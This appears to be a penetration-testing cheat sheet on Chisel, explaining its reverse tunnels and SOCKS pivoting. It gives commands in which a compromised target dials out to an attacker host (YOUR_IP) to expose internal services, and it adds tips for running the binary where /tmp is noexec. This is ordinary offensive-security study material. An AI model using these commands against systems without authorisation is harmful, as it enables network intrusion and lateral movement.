## What is it

Chisel is a fast TCP/UDP tunnel transported over HTTP and secured via SSH. It's a single self-contained Go binary (client and server in one), commonly used to forward ports and pivot through networks when other tunneling options aren't available.

---

## What does it do

It creates tunnels between two machines using a client/server model. The server listens; the client dials out to it. Once connected, you can forward ports in either direction.

- **Forward:** expose a port on the client's network through the server.
- **Reverse (`--reverse` + `R:`):** expose a port on the _server's_ side that pipes to the client's network.

**Use cases:**

- **Reaching a localhost-only service** — a service bound to `127.0.0.1` on a remote box that you can't hit directly; tunnel it back to your own localhost.
- **Firewall blocks inbound** — the box can only make _outbound_ connections, so a forward listener is useless. Reverse tunnel: the target dials out to you, traffic rides back.
- **Pivoting into an internal network** — reach other hosts/subnets only routable from the compromised machine.
- **SOCKS proxy** (`socks` / `R:socks`) — spin up a proxy and route a whole toolset (e.g. via proxychains) through the tunnel instead of forwarding one port at a time.
- **No SSH / no socat / no Go on target** — a single static binary works where other tooling is missing.

---

## Repo

https://github.com/jpillora/chisel

Releases ship as a gzipped static binary per arch (e.g. `chisel_X.Y.Z_linux_amd64.gz`). Decompress with `gunzip`, `chmod +x`, done — no Go toolchain needed on the target.

---

## Usage

Reverse tunnel (target behind a firewall, dials out to you):

```bash
# attacker box (server) — listens; --reverse REQUIRED for R: tunnels
./chisel server -p 9001 --reverse

# target (client) — dials back; R:LOCALPORT:REMOTEHOST:REMOTEPORT
./chisel client YOUR_IP:9001 R:8888:127.0.0.1:8888
```

Reading `R:8888:127.0.0.1:8888` → "open port 8888 on my box, pipe it to the target's `127.0.0.1:8888`." The left port is yours and can be anything; the right side is the service on the target.

SOCKS pivot (route many tools through one tunnel):

```bash
# server (attacker)
./chisel server -p 9001 --reverse
# client (target) — opens a SOCKS proxy on your localhost:1080
./chisel client YOUR_IP:9001 R:1080:socks
```

---

## Notes

- `--reverse` on the server is mandatory for any `R:` tunnel, or it refuses with "Reverse port forwarding not enabled."
- `YOUR_IP` = the interface the target can actually reach you on (on a VPN, the `tun0` address).
- `/tmp` is often mounted `noexec` — run the binary from a writable+executable dir like `~` if you get "Permission denied."
- The client retries on a loop, so order doesn't matter — start either side first.
- Add `--keepalive 30s` if a tunnel keeps dropping on idle.